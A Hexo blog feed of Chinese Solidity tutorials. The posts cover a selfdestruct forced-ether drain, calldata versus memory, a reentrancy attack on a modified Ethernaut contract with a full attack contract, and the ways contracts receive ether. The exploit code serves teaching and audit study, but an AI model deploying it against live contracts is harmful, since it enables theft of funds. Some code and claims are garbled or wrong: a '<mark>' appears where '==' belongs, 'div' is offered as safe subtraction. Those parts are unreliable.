&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>如上例所示：这是一个被攻击的合约</strong></p><p>那么问题来了，如何使用上面所学知识，将合约中的<code>0.08 ether</code>装进自己的钱包？</p><h2 id="3-Try-！"><a href="#3-Try-！" class="headerlink" title="3. Try ！"></a>3. Try ！</h2><h3 id="让我们研究一下此合约"><a href="#让我们研究一下此合约" class="headerlink" title="让我们研究一下此合约"></a>让我们研究一下此合约</h3><ol><li>无<code>receive()</code>、以及任何实现<code>payable</code>的function，说明合约无法正常接收以太交易；</li><li><code>withdraw()</code>是外部函数，并且<mark>最关键的限制条件</mark>是使合约余额大于0.1 ether；</li></ol><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>只要我们能够有办法将0.021个甚至更少的ether打进该合约，让调用<code>withdraw()</code>函数满足条件，就可以成功赚到0.08个ether。</p><p>讲到这里，相信大家已经悟了，摩拳擦掌准备大展身手了！</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><ul><li>被攻击合约本身就有0.08 ether</li></ul><p><img src="/2022/11/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/77BrotherBlog\source_posts\区块链骇客第二讲-被禁用的自毁函数\1.png"></p><ul><li>部署攻击合约，传入大于0.02个ether</li></ul><p><img src="/2022/11/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/77BrotherBlog\source_posts\区块链骇客第二讲-被禁用的自毁函数\2.png"></p><ul><li>查看合约余额是否大于0.1 ether</li></ul><p><img src="/2022/11/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/77BrotherBlog\source_posts\区块链骇客第二讲-被禁用的自毁函数\3.png"></p><ul><li>调用<code>withdraw()</code>函数提取合约所有余额，大功告成！</li></ul><p><img src="/2022/11/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/77BrotherBlog\source_posts\区块链骇客第二讲-被禁用的自毁函数\4.png"></p><h2 id="更多区块链技术干货请关注"><a href="#更多区块链技术干货请关注" class="headerlink" title="更多区块链技术干货请关注"></a>更多区块链技术干货请关注</h2><p><a href="http://www.lanlianbbs.com/">岚链技术论坛</a></p><p><a href="https://nangbowan.github.io/">77Brother的技术小栈（个人博客）</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链骇客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>合约安全审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单粗暴区分Solidity的calldata和memory</title>
    <link href="/2022/11/01/%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E5%8C%BA%E5%88%86Solidity%E7%9A%84calldata%E5%92%8Cmemory/"/>
    <url>/2022/11/01/%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E5%8C%BA%E5%88%86Solidity%E7%9A%84calldata%E5%92%8Cmemory/</url>
    
    <content type="html"><![CDATA[<blockquote><p>最近回顾了很多基础知识，发现很多文章都是谷歌翻译过来，又拖沓讲得又不够清楚，于是决定自己用简单的例子概括。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: Unlicense<br>pragma solidity 0.8.0;<br><br>contract Difference&#123;<br><br>    string public name;<br>    <br>    //memory可以用于任何函数的声明参数<br>    //返回值可以用memory,但不能用calldata<br>     function useMemory(string memory _in)internal returns(string memory)&#123;<br>       name = _in;<br>       <br>       //memory是可临时改变的<br>       _in = name;<br>       <br>       return name;<br>    &#125;<br><br>    //calldata只能用于external函数的声明参数<br>    //返回值可以用memory,但不能用calldata<br>    //calldata是最便宜的存储位置,花费gas最少<br>    function useCalldata(string calldata _in)external returns(string memory)&#123;<br>        name = _in;<br><br>        //calldata是不能临时改变的<br>        //_in = name; 就会报错<br>        return name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>calldata是memory的<mark>低配版</mark>，降低了gas花费，因此在使用上相对受限。</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>智能合约 基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链骇客第一讲:重入攻击</title>
    <link href="/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%B8%80%E8%AE%B2-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <url>/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%B8%80%E8%AE%B2-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章开启区块链骇客专栏的第一讲，让我决心开写本专栏的首要原因是对未来的职业选择有了一个确定的规划。</p><p>日后的更新频率将会不小于等于每周一讲，欢迎各位读者监督和指正，一起学习一同进步！</p></blockquote><h2 id="📕1-挑战"><a href="#📕1-挑战" class="headerlink" title="📕1. 挑战"></a>📕1. 挑战</h2><ul><li>这是<code>Ethernaut</code>中的一个例子（已修改）</li><li><strong>现在把需求交给你</strong>：使用<mark>重入攻击</mark>将以下合约中的资金全部取走。</li><li>你会先想到什么？什么是重入攻击？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol&quot;;<br><br>contract Reentrance &#123;<br>    using SafeMath for uint256;<br>    mapping(address =&gt; uint256) public balances;<br><br>    constructor() public payable &#123;&#125;<br><br>    function donate(address _to) public payable &#123;<br>        balances[_to] = balances[_to].add(msg.value);<br>    &#125;<br><br>    function balanceOf(address _who) public view returns (uint256 balance) &#123;<br>        return balances[_who];<br>    &#125;<br><br>    function withdraw(uint256 _amount) public &#123;<br>        if (balances[msg.sender] &gt;= _amount) &#123;<br>            (bool result, ) = address(msg.sender).call.value(_amount)(&quot;&quot;);<br>            if (result) &#123;<br>                _amount;<br>            &#125;<br>            balances[msg.sender] -= _amount;<br>        &#125;<br>    &#125;<br><br>    receive() external payable &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="📕2-思考"><a href="#📕2-思考" class="headerlink" title="📕2. 思考"></a>📕2. 思考</h2><blockquote><p>挑战先放在那，作为我们最后的一个实战练习。</p><p>先来看看重入攻击，到底是什么？</p></blockquote><h3 id="⭐重入原理：检查-生效-交互模式"><a href="#⭐重入原理：检查-生效-交互模式" class="headerlink" title="⭐重入原理：检查-生效-交互模式"></a>⭐重入原理：<a href="https://learnblockchain.cn/docs/solidity/security-considerations.html#checks-effects-interactions">检查-生效-交互模式</a></h3><blockquote><p>检查-生效-交互模式是solidity官方给出的该语言所遵循的机制</p><p>同时它也是重入攻击所利用的原理</p></blockquote><p><strong>用简练的语言概括这个模式</strong></p><ol><li>检查：检查函数是否能满足被正常调用的条件；</li><li>生效：处理合约状态变量修改；</li><li>交互：<mark>在这些事情完成之后，才能与外部合约做交互</mark>；</li></ol><p><strong>这就是一个合约函数从被调用到上链同步的流程；</strong></p><hr><p><strong>有同学不理解这个模式，那我举个例子描述</strong>：</p><ol><li>你去银行提款机取钱；</li><li>首先你得带卡吧，没卡取不了；除了带卡，你带的也得是本行的卡吧，带错了也取不了；带对卡了，你也得保证你卡里有钱吧，不然取啥钱；有钱也不一定管用，你还得保证你的卡是可用的….</li><li>当你满足了所有条件后，银行账户余额将会<mark>提前</mark>减少你取的数额，并将改变后的余额写进系统；此时提款机才吐钱，你的手上才多了这笔钱；</li><li><mark>在这些事情完成之后，你才能拿这笔钱去做其他事情</mark>；</li></ol><p><strong>这下懂了吧</strong>！</p><h3 id="🚀大胆猜想"><a href="#🚀大胆猜想" class="headerlink" title="🚀大胆猜想"></a>🚀大胆猜想</h3><blockquote><p>那既然合约基本都遵循这个原理，如何利用它？</p></blockquote><ol><li>可不可以趁合约修改状态还没闭环时，再修改它的状态？</li><li>想一想算法中的<mark>递归</mark>，设置一个条件，直到状态变量达到条件时递归才停止；</li><li>在合约中有没有这个条件存在，如何触发合约的递归呢？</li></ol><h2 id="📕3-实操Reentrance合约"><a href="#📕3-实操Reentrance合约" class="headerlink" title="📕3. 实操Reentrance合约"></a>📕3. 实操<code>Reentrance</code>合约</h2><blockquote><p>我们看上文留下的挑战</p></blockquote><p>⭐<strong>引入：</strong>SafeMath库，合约按理来说将不会发生溢出错误，除开没用到该库的地方；</p><p>⭐<strong>构造器：</strong>合约无构造器；</p><p>⭐<strong>函数：</strong></p><ol><li><code>donate</code>捐赠函数，可以向任意地址<code>_to</code>捐赠以太，<code>balances</code>哈希表记录数额；</li><li><code>balanceof</code>查看余额函数，返回地址<code>_who</code>记录的余额；</li><li><code>receive</code>接受以太函数；</li></ol><p>⭐<strong>问题函数：</strong></p><p><code>withdraw</code>提款函数，被捐赠地址可以通过此函数提取以太；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="☠-这个函数有两个大问题"><a href="#☠-这个函数有两个大问题" class="headerlink" title="☠ 这个函数有两个大问题"></a>☠ <strong>这个函数有两个大问题</strong></h3><ol><li>首先合约版本&lt;8.0，这就意味着除了用到safemath库以外的地方，都可能存在溢出漏洞；如 <code> balances[msg.sender] -= _amount;</code>它明明可以写成<code>balances[msg.sender].div(_amount);</code>调用safemath库的<code>div</code>方法来避免安全问题，但它就是写成了<code>-=_amount</code>; 不过这也正常，由于减少余额之前做了一个判断：<code>if(balances[msg.sender] &gt;= _amount)</code>，因此在正常情况下不可能发生漏洞；那么在不正常的情况下呢？</li><li><strong>更致命的问题</strong> 在于这个函数没有遵循 <a href="https://learnblockchain.cn/docs/solidity/security-considerations.html#checks-effects-interactions">检查-生效-交互模式</a>。形象来说，就是你马上要拿到这笔钱了，却跟银行说这钱不能够打到我的账上，于是又问银行要了这笔钱，这会给合约带来致命的问题（勿代入现实生活）</li></ol><p><strong>现在我们写一个合约来攻击<code>Reentrance</code>合约</strong></p><h3 id="AttackContract-sol"><a href="#AttackContract-sol" class="headerlink" title="AttackContract.sol"></a><code>AttackContract.sol</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: Unlicense<br>pragma solidity 0.8.0;<br><br>//攻击合约<br>contract AttackReentrance &#123;<br>    address public attackedContract;<br>    address private owner;<br>    uint256 private initialDonation;<br>    //重入锁指针<br>    bool private exploited;<br><br>    constructor(address _attacked) &#123;<br>        //传入被攻击合约地址<br>        attackedContract = _attacked;<br>        exploited = false;<br>        //初始化合约拥有者<br>        owner = msg.sender;<br>    &#125;<br><br>    //合约提款函数<br>    function withdraw() external &#123;<br>        uint256 balance = address(this).balance;<br>        (bool success, ) = owner.call&#123;value: balance&#125;(&quot;&quot;);<br>        require(success, &quot;you are not owner of the contract!&quot;);<br>    &#125;<br><br>    function exploit() external payable &#123;<br>        require(msg.value &gt; 0, &quot;donate something!&quot;);<br>        initialDonation = msg.value;<br><br>        // 向被攻击合约捐赠 10 wei<br>        (bool success1, ) = payable(attackedContract).call&#123;value: msg.value&#125;(<br>            abi.encodeWithSignature(&quot;donate(address)&quot;, address(this))<br>        );<br><br>        require(success1, &quot;success1 falied&quot;);<br><br>        // 提取 传入数额<br>        (bool success2, ) = payable(attackedContract).call(<br>            abi.encodeWithSignature(&quot;withdraw(uint256)&quot;, initialDonation)<br>        );<br>        require(success2, &quot;success2 falied&quot;);<br><br>        // 由于被攻击合约会产生下溢漏洞因此它的余额在合约中将会无限放大<br>        // 现在就可以直接将被攻击合约余额全部提取<br>        (bool success3, ) = payable(attackedContract).call(<br>            abi.encodeWithSignature(<br>                &quot;withdraw(uint256)&quot;,<br>                address(attackedContract).balance<br>            )<br>        );<br>        require(success3, &quot;success3 falied&quot;);<br>    &#125;<br><br>    //接收以太默认函数<br>    receive() external payable &#123;<br>        //加入重入锁，防止本合约被攻击<br>        if (!exploited) &#123;<br>            exploited = true;<br><br>            //重入攻击关键！！在接受以太之时调用提款函数<br>            //造成状态叠加，破环（检查-生效-交互模式）<br>            (bool success4, ) = payable(attackedContract).call(<br>                abi.encodeWithSignature(&quot;withdraw(uint256)&quot;, initialDonation)<br>            );<br><br>            require(success4, &quot;success4 falied&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br><br>//调用合约<br>contract Useattack &#123;<br>    AttackReentrance public attackContract;<br>    address public owner;<br><br>    //首先得给调用合约打入10wei攻击资金,因此是payable关键词<br>    constructor(AttackReentrance _attack) payable&#123;<br>        //传入被攻击合约地址<br>        attackContract = _attack;<br>        owner = msg.sender;<br>    &#125;<br><br>    modifier onlyOwner()&#123;<br>        require(msg.sender == owner);<br>        _;<br>    &#125;<br><br>    function attack(uint256 _amount) public onlyOwner&#123;<br>        attackContract.exploit&#123;value:_amount&#125;();<br>        attackContract.withdraw();<br>    &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="⭐解析攻击合约"><a href="#⭐解析攻击合约" class="headerlink" title="⭐解析攻击合约"></a>⭐解析攻击合约</h3><blockquote><p>此攻击合约巧妙利用了被攻击合约的两大漏洞！</p></blockquote><p>把焦点放到<code>exploit()</code>和<code>receive()</code>函数</p><ol><li>调用调用<code>exploit()</code>函数，传入10wei以太。</li><li>在<code>exploit()</code>函数中，首先调用被攻击合约的捐款函数，参数为被攻击合约；</li><li>然后调用被攻击合约的<code>donate</code>函数，参数为10wei;</li><li>调用被攻击合约的<code>withdraw()</code>函数，被攻击合约将在此时朝攻击合约发送10wei以太；</li><li><mark>最关键的一步：攻击合约receive()函数被动接收以太，但在函数中再一次地，调用了被攻击合约的withdraw()函数！</mark></li><li>至此被攻击合约<mark>陷入递归状态</mark>，将会不断地提款直至被攻击合约的余额发生下溢；</li><li>最后我们利用下溢错误，将被攻击合约余额全部提取至攻击合约；</li><li>接下来调用攻击合约的<code>withdraw()</code>函数将余额提取到自己的钱包。</li></ol><h3 id="⭐解析调用合约"><a href="#⭐解析调用合约" class="headerlink" title="⭐解析调用合约"></a>⭐解析调用合约</h3><blockquote><p>调用合约是调用攻击合约的合约</p></blockquote><ol><li>部署时不要忘记给调用合约打100wei攻击成本；</li><li>部署完成后调用<code>attack()</code>函数，参数<code>_amount</code>设置为10；</li></ol><h2 id="📕4-总结"><a href="#📕4-总结" class="headerlink" title="📕4. 总结"></a>📕4. 总结</h2><p>在攻击过程中，我们破坏了<code>检查-生效-交互模式</code>，将合约的状态始终卡死在<code>balances[msg.sender] &gt;= _amount</code>状态，</p><p>使得<code>balances[msg.sender] -= _amount</code>余额不断减少，直至下溢漏洞的产生。一旦产生下溢，<code>balances[msg.sender]</code></p><p>将会变为无限大即2的256次方，此时提取合约全部余额，将会被合约视为理所当然！</p><h2 id="🚀更多区块链技术干货请关注"><a href="#🚀更多区块链技术干货请关注" class="headerlink" title="🚀更多区块链技术干货请关注"></a>🚀更多区块链技术干货请关注</h2><p><a href="https://nangbowan.github.io/">77Brother的技术小栈</a></p><p><a href="http://www.lanlianbbs.com/">岚链论坛 – 区块链技术的高质量社区</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链骇客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>合约安全审计</tag>
      
      <tag>重入攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Solidity:接受以太的所有可能性</title>
    <link href="/2022/10/26/Solidity-%E6%8E%A5%E5%8F%97%E4%BB%A5%E5%A4%AA%E7%9A%84%E6%89%80%E6%9C%89%E5%8F%AF%E8%83%BD%E6%80%A7/"/>
    <url>/2022/10/26/Solidity-%E6%8E%A5%E5%8F%97%E4%BB%A5%E5%A4%AA%E7%9A%84%E6%89%80%E6%9C%89%E5%8F%AF%E8%83%BD%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<blockquote><p>目前来看，智能合约接受以太共有五种可能性；</p></blockquote><h2 id="1-receive"><a href="#1-receive" class="headerlink" title="1. receive()"></a>1. receive()</h2><p>一个合约最多有一个 <code>receive</code> 函数, 声明函数为： <code>receive() external payable &#123;&#125;</code></p><p>无需 <code>function</code> 关键字，也没有参数和返回值并且必须是<code>external</code>可见性和<code>payable</code> 修饰。 它可以是 <code>virtual</code> 的，可以被重载也可以有修改器modifier 。</p><p>在对合约没有<mark>任何附加数据调用</mark>（通常是对合约转账）是会执行 <code>receive</code> 函数。　</p><p>例如通过 <code>.send()</code> or <code>.transfer()</code> 如果 <code>receive</code> 函数不存在，但是有payable的 <a href="https://learnblockchain.cn/docs/solidity/contracts.html#fallback-function">fallback 回退函数</a> 那么在进行纯以太转账时，fallback 函数会被调用。</p><p>如果两个函数都没有，这个合约就没法通过常规的转账交易接收以太，会抛出异常。</p><p>并且，<code>receive</code> 函数只有 2300 gas 可以使用， 除了基础的日志输出之外，进行其他操作的余地很小。下面的操作消耗会操作 2300 gas :</p><ul><li>写入存储</li><li>创建合约</li><li>调用消耗大量 gas 的外部函数</li><li>发送以太币</li></ul><p><mark>不过</mark>，与任何其他函数一样，只要<mark>有足够的 gas 传递给它</mark>，回退函数就可以执行复杂的操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>// 这个合约会保留所有发送给它的以太币，没有办法取回。<br>contract Sink &#123;<br>    event Received(address, uint);<br>    receive() external payable &#123;<br>        emit Received(msg.sender, msg.value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-实现payable的fallback"><a href="#2-实现payable的fallback" class="headerlink" title="2. 实现payable的fallback()"></a>2. 实现payable的fallback()</h2><p>合约可以最多有一个回退函数。函数声明为： <code>fallback() external [payable]</code> 或 <code>fallback() (bytes calldata input) external [payable] returns (bytes memory output)</code></p><p>没有<code>function</code>关键字。必须是<code>external</code>可见性，它可以是 <code>virtual</code> 的，可以被重载也可以有 修改器modifier 。</p><p>fallback　函数始终会接收数据，但为了同时接收以太时，必须标记为<code>payable</code> 。</p><p>如果使用了带参数的版本， <code>input</code> 将包含发送到合约的完整数据（等于 <code>msg.data</code> ），并且通过 <code>output</code> 返回数据。 返回数据不是 ABI 编码过的数据，相反，它返回不经过修改的数据。</p><p>如果回退函数在接收以太时调用，只有 2300 gas 可以使用。</p><p><mark>不过</mark>，与任何其他函数一样，只要<mark>有足够的 gas 传递给它</mark>，回退函数就可以执行复杂的操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: GPL-3.0<br>pragma solidity &gt;=0.6.2 &lt;0.9.0;<br><br>contract Test &#123;<br>    // 发送到这个合约的所有消息都会调用此函数（因为该合约没有其它函数）。<br>    // 向这个合约发送以太币会导致异常，因为 fallback 函数没有 `payable` 修饰符<br>    fallback() external &#123; x = 1; &#125;<br>    uint x;<br>&#125;<br><br><br>// 这个合约会保留所有发送给它的以太币，没有办法返还。<br>contract TestPayable &#123;<br>    uint x;<br>    uint y;<br><br>    // 除了纯转账外，所有的调用都会调用这个函数．<br>    // (因为除了 receive 函数外，没有其他的函数).<br>    // 任何对合约非空calldata 调用会执行回退函数(即使是调用函数附加以太).<br>    fallback() external payable &#123; x = 1; y = msg.value; &#125;<br><br>    // 纯转账调用这个函数，例如对每个空empty calldata的调用<br>    receive() external payable &#123; x = 2; y = msg.value; &#125;<br>&#125;<br><br>contract Caller &#123;<br>    function callTest(Test test) public returns (bool) &#123;<br>        (bool success,) = address(test).call(abi.encodeWithSignature(&quot;nonExistingFunction()&quot;));<br>        require(success);<br>        //  test.x 结果变成 &lt;mark&gt; 1。<br><br>        // address(test) 不允许直接调用 ``send`` ,  因为 ``test`` 没有 payable 回退函数<br>        //  转化为 ``address payable`` 类型 , 然后才可以调用 ``send``<br>        address payable testPayable = payable(address(test));<br><br><br>        // 以下将不会编译，但如果有人向该合约发送以太币，交易将失败并拒绝以太币。<br>        // test.send(2 ether）;<br>    &#125;<br><br>    function callTestPayable(TestPayable test) public returns (bool) &#123;<br>        (bool success,) = address(test).call(abi.encodeWithSignature(&quot;nonExistingFunction()&quot;));<br>        require(success);<br>        // 结果 test.x 为 1  test.y 为 0.<br>        (success,) = address(test).call&#123;value: 1&#125;(abi.encodeWithSignature(&quot;nonExistingFunction()&quot;));<br>        require(success);<br>        // 结果test.x 为1 而 test.y 为 1.<br><br>        // 发送以太币, TestPayable 的 receive　函数被调用．<br><br>        // 因为函数有存储写入, 会比简单的使用 ``send`` or ``transfer``消耗更多的 gas。<br>        // 因此使用底层的call调用<br>        (success,) = address(test).call&#123;value: 2 ether&#125;(&quot;&quot;);<br>        require(success);<br><br>        // 结果 test.x 为 2 而 test.y 为 2 ether.<br><br>        return true;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注：实现payable的fallback-和receive-的区别"><a href="#注：实现payable的fallback-和receive-的区别" class="headerlink" title="注：实现payable的fallback() 和receive() 的区别"></a>注：实现payable的fallback() 和receive() 的区别</h3><ol><li>receive()优先接受<mark>纯以太</mark>的交易</li><li>实现payable的fallback()优先接受<mark>附带</mark>msg.data的交易</li></ol><h2 id="3-实现payable的函数"><a href="#3-实现payable的函数" class="headerlink" title="3. 实现payable的函数"></a>3. 实现payable的函数</h2><blockquote><p>这种方式无需多言，加个payable关键词就可以了！</p></blockquote><h2 id="4-selfdestruct"><a href="#4-selfdestruct" class="headerlink" title="4. selfdestruct()"></a>4. selfdestruct()</h2><blockquote><p>自毁函数是具有攻击性的一种让其它合约被迫接受以太的方式</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack&#123;<br><br> address private owner;<br><br> constructor()&#123;<br> owner = msg.sender;<br> &#125;<br> <br> event Received(address, uint);<br>    receive() external payable &#123;<br>        emit Received(msg.sender, msg.value);<br>  &#125;<br>  <br> //自毁转账<br> function selfdestructAttack(address _to) external public&#123;<br>     require(msg.sender &lt;mark&gt; this.owner,&quot;you are not the owner&quot;);<br>     selfdestruct(_to);<br> &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>如上例所示，当调用合约的<code>selfdestructAttack</code>函数时，此合约将会自毁，并且将合约内的余额强制发送到 _ to这个合约地址上，无论_ to合约是否实现接受以太的函数，都<mark>不得不接受</mark>这笔转账。</p><h2 id="5-miner区块奖励"><a href="#5-miner区块奖励" class="headerlink" title="5. miner区块奖励"></a>5. 